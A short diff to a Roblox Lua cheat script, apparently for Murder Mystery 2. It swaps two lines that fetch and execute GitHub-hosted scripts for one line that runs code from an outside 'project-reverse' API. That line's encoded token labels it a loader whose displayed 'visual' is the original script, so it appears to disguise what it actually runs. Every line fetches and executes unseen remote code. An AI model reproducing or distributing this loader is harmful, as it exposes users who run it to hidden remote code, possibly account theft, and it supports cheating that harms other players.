@@ -1,9 +1,1 @@
-local function k()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/RobloxScriptHubz/Scripts/refs/heads/main/1MM2MainScript'))()
-end
-local function a()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/BestScripters/MM2/refs/heads/main/Script'))()
-end
-
-task.spawn(k)
-task.spawn(a)
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjFhY2M4MDY5LWMxZDYtNGYzNS05NTc0LTkzYmI2ODkxNGZjNCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vUm9ibG94U2NyaXB0SHViei9TY3JpcHRzL3JlZnMvaGVhZHMvbWFpbi8xTU0yTWFpblNjcmlwdCJ9fQ"))()
